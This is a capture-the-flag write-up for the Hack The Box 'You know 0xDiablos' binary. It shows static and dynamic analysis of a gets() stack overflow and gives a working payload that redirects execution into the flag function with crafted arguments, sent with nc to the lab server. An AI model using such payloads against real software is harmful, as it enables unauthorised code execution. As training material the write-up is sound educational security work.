# Lab: You know 0xDiablos
Date: 2024-07-24

## Static Analysis
I started the analysis by examining the binary file using the `file` command:

```bash
└─# file vuln                                              
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ab7f19bb67c16ae453d4959fba4e6841d930a6dd, for GNU/Linux 3.2.0, not stripped
```

The output indicates that the file is a 32-bit ELF executable for GNU/Linux.

Next, I used the strings command to look for interesting strings within the binary:

```bash
└─# strings -a -t x vuln
...
   2ed libc.so.6
...
   200a flag.txt
   2014 Hurry up and try in on server side.
   2038 You know who are 0xDiablos: 
...
   365d vuln
...
   3799 flag
...
```
Key observations:

* The binary uses the libc library, suggesting a potential return-to-libc attack.
* There is a flag.txt file referenced.

I then disassembled the binary using `objdump` to gain further insights:

```bash
└─# objdump -d vuln        

vuln:     file format elf32-i386
...

080491e2 <flag>:
 80491e2:	55                   	push   %ebp
 80491e3:	89 e5                	mov    %esp,%ebp
 80491e5:	53                   	push   %ebx
 80491e6:	83 ec 54             	sub    $0x54,%esp
 80491e9:	e8 32 ff ff ff       	call   8049120 <__x86.get_pc_thunk.bx>
 80491ee:	81 c3 12 2e 00 00    	add    $0x2e12,%ebx
 80491f4:	83 ec 08             	sub    $0x8,%esp
 80491f7:	8d 83 08 e0 ff ff    	lea    -0x1ff8(%ebx),%eax
 80491fd:	50                   	push   %eax
 80491fe:	8d 83 0a e0 ff ff    	lea    -0x1ff6(%ebx),%eax
 8049204:	50                   	push   %eax
 8049205:	e8 a6 fe ff ff       	call   80490b0 <fopen@plt>
 804920a:	83 c4 10             	add    $0x10,%esp
 804920d:	89 45 f4             	mov    %eax,-0xc(%ebp)
 8049210:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
 8049214:	75 1c                	jne    8049232 <flag+0x50>
 8049216:	83 ec 0c             	sub    $0xc,%esp
 8049219:	8d 83 14 e0 ff ff    	lea    -0x1fec(%ebx),%eax
 804921f:	50                   	push   %eax
 8049220:	e8 4b fe ff ff       	call   8049070 <puts@plt>
 8049225:	83 c4 10             	add    $0x10,%esp
 8049228:	83 ec 0c             	sub    $0xc,%esp
 804922b:	6a 00                	push   $0x0
 804922d:	e8 4e fe ff ff       	call   8049080 <exit@plt>
 8049232:	83 ec 04             	sub    $0x4,%esp
 8049235:	ff 75 f4             	push   -0xc(%ebp)
 8049238:	6a 40                	push   $0x40
 804923a:	8d 45 b4             	lea    -0x4c(%ebp),%eax
 804923d:	50                   	push   %eax
 804923e:	e8 0d fe ff ff       	call   8049050 <fgets@plt>
 8049243:	83 c4 10             	add    $0x10,%esp
 8049246:	81 7d 08 ef be ad de 	cmpl   $0xdeadbeef,0x8(%ebp)
 804924d:	75 1a                	jne    8049269 <flag+0x87>
 804924f:	81 7d 0c 0d d0 de c0 	cmpl   $0xc0ded00d,0xc(%ebp)
 8049256:	75 14                	jne    804926c <flag+0x8a>
 8049258:	83 ec 0c             	sub    $0xc,%esp
 804925b:	8d 45 b4             	lea    -0x4c(%ebp),%eax
 804925e:	50                   	push   %eax
 804925f:	e8 cc fd ff ff       	call   8049030 <printf@plt>
 8049264:	83 c4 10             	add    $0x10,%esp
 8049267:	eb 04                	jmp    804926d <flag+0x8b>
 8049269:	90                   	nop
 804926a:	eb 01                	jmp    804926d <flag+0x8b>
 804926c:	90                   	nop
 804926d:	8b 5d fc             	mov    -0x4(%ebp),%ebx
 8049270:	c9                   	leave
 8049271:	c3                   	ret
...
08049272 <vuln>:
 8049272:	55                   	push   %ebp
 8049273:	89 e5                	mov    %esp,%ebp
 8049275:	53                   	push   %ebx
 8049276:	81 ec b4 00 00 00    	sub    $0xb4,%esp
 804927c:	e8 9f fe ff ff       	call   8049120 <__x86.get_pc_thunk.bx>
 8049281:	81 c3 7f 2d 00 00    	add    $0x2d7f,%ebx
 8049287:	83 ec 0c             	sub    $0xc,%esp
 804928a:	8d 85 48 ff ff ff    	lea    -0xb8(%ebp),%eax
 8049290:	50                   	push   %eax
 8049291:	e8 aa fd ff ff       	call   8049040 <gets@plt>
 8049296:	83 c4 10             	add    $0x10,%esp
 8049299:	83 ec 0c             	sub    $0xc,%esp
 804929c:	8d 85 48 ff ff ff    	lea    -0xb8(%ebp),%eax
 80492a2:	50                   	push   %eax
 80492a3:	e8 c8 fd ff ff       	call   8049070 <puts@plt>
 80492a8:	83 c4 10             	add    $0x10,%esp
 80492ab:	90                   	nop
 80492ac:	8b 5d fc             	mov    -0x4(%ebp),%ebx
 80492af:	c9                   	leave
 80492b0:	c3                   	ret

080492b1 <main>:
 80492b1:	8d 4c 24 04          	lea    0x4(%esp),%ecx
 80492b5:	83 e4 f0             	and    $0xfffffff0,%esp
 80492b8:	ff 71 fc             	push   -0x4(%ecx)
 80492bb:	55                   	push   %ebp
 80492bc:	89 e5                	mov    %esp,%ebp
 80492be:	53                   	push   %ebx
 80492bf:	51                   	push   %ecx
 80492c0:	83 ec 10             	sub    $0x10,%esp
 80492c3:	e8 58 fe ff ff       	call   8049120 <__x86.get_pc_thunk.bx>
 80492c8:	81 c3 38 2d 00 00    	add    $0x2d38,%ebx
 80492ce:	8b 83 fc ff ff ff    	mov    -0x4(%ebx),%eax
 80492d4:	8b 00                	mov    (%eax),%eax
 80492d6:	6a 00                	push   $0x0
 80492d8:	6a 02                	push   $0x2
 80492da:	6a 00                	push   $0x0
 80492dc:	50                   	push   %eax
 80492dd:	e8 be fd ff ff       	call   80490a0 <setvbuf@plt>
 80492e2:	83 c4 10             	add    $0x10,%esp
 80492e5:	e8 76 fd ff ff       	call   8049060 <getegid@plt>
 80492ea:	89 45 f4             	mov    %eax,-0xc(%ebp)
 80492ed:	83 ec 04             	sub    $0x4,%esp
 80492f0:	ff 75 f4             	push   -0xc(%ebp)
 80492f3:	ff 75 f4             	push   -0xc(%ebp)
 80492f6:	ff 75 f4             	push   -0xc(%ebp)
 80492f9:	e8 c2 fd ff ff       	call   80490c0 <setresgid@plt>
 80492fe:	83 c4 10             	add    $0x10,%esp
 8049301:	83 ec 0c             	sub    $0xc,%esp
 8049304:	8d 83 38 e0 ff ff    	lea    -0x1fc8(%ebx),%eax
 804930a:	50                   	push   %eax
 804930b:	e8 60 fd ff ff       	call   8049070 <puts@plt>
 8049310:	83 c4 10             	add    $0x10,%esp
 8049313:	e8 5a ff ff ff       	call   8049272 <vuln>
 8049318:	b8 00 00 00 00       	mov    $0x0,%eax
 804931d:	8d 65 f8             	lea    -0x8(%ebp),%esp
 8049320:	59                   	pop    %ecx
 8049321:	5b                   	pop    %ebx
 8049322:	5d                   	pop    %ebp
 8049323:	8d 61 fc             	lea    -0x4(%ecx),%esp
 8049326:	c3                   	ret
 8049327:	66 90                	xchg   %ax,%ax
 8049329:	66 90                	xchg   %ax,%ax
 804932b:	66 90                	xchg   %ax,%ax
 804932d:	66 90                	xchg   %ax,%ax
 804932f:	90                   	nop
...
```

Three important functions were identified:

* main: It calls the vuln function.
* vuln: It calls the gets function, which is known to be unsafe.
* flag: This function is never called directly.

Running the application revealed its simple functionality:

```bash
└─# ./vuln     
You know who are 0xDiablos: 
hello
hello
```

The application prompts for input and echoes it back.

## Dynamic Analysis
To proceed with dynamic analysis, I disabled Address Space Layout Randomization (ASLR):

```bash
└─# echo 0 > /proc/sys/kernel/randomize_va_space
```

Using gdb with the peda extension, I checked the security features of the binary:

```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

I set a breakpoint at the vuln function and ran the program to the point where gets is called. By experimenting with input lengths, I determined that the buffer overflow occurs after 188 characters:

```bash
└─# python3 -c "import sys; sys.stdout.buffer.write(b'A' * 188 + b'B' * 4)"                   
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB 
```

Replacing the four Bs with the address of the flag function resulted in the following:

```bash
└─# echo $(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 188 + b'\xe2\x91\x04\x08')") | ./vuln 
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
Hurry up and try it on the server side.
```

Trying this on the server side did not yield immediate results.

Further static analysis using Ghidra provided a clearer view of the flag function, which takes two parameters and reads flag.txt. If certain conditions are met, it prints the flag's contents.

![image](https://github.com/user-attachments/assets/e77182d1-cf56-4738-ba04-de9f9e66979e)

I created a flag.txt file with "Hello" as its content and prepared a return-to-libc attack payload, where `0x080491e2` is the flag function address, `0xdeadbeef` the param 1 value address and `0xc0ded00d` the param 2 value address notice with Ghidra:

```bash
└─# echo Hello > flag.txt                                                                              
└─# echo $(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 188 + b'\xe2\x91\x04\x08' + b'DUMY' + b'\xef\xbe\xad\xde' + b'\x0d\xd0\xde\xc0')") | ./vuln                
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADUMYﾭ 
Hello
zsh: done                echo  | 
zsh: segmentation fault  ./vuln
```

Finally, trying this payload on the server side resulted in success:

```bash
└─# echo $(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 188 + b'\xe2\x91\x04\x08' + b'DUMY' + b'\xef\xbe\xad\xde' + b'\x0d\xd0\xde\xc0')") | nc 83.136.252.57 32521
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADUMYﾭ 
HTB{...}
```

Boom!

For automation, I wrote a Python script located in the this repo called **yesIknow.py** (probably you won't get the flag at the first time, if you don't get the flag run it one more times):

```bash
└─# python3 yesIknow.py <IP> <PORT>
[+] Socket connected
b'You know who are 0xDiablos: \n'
[+] Payload sent
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe2\x91\x04\x08DUMY\xef\xbe\xad\xde\r\xd0\xde\xc0\nHTB{...}'
[+] Socket closed
```
## Overview
Through this exercise, I enhanced my skills in static and dynamic binary analysis using various tools. I deepened my understanding of stack overflow vulnerabilities and the return-to-libc attack technique.

## Resources
* [Return-to-libc / ret2libc](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)
* [Bypassing non-executable-stack during exploitation using return-to-libc](https://css.csail.mit.edu/6.858/2014/readings/return-to-libc.pdf)
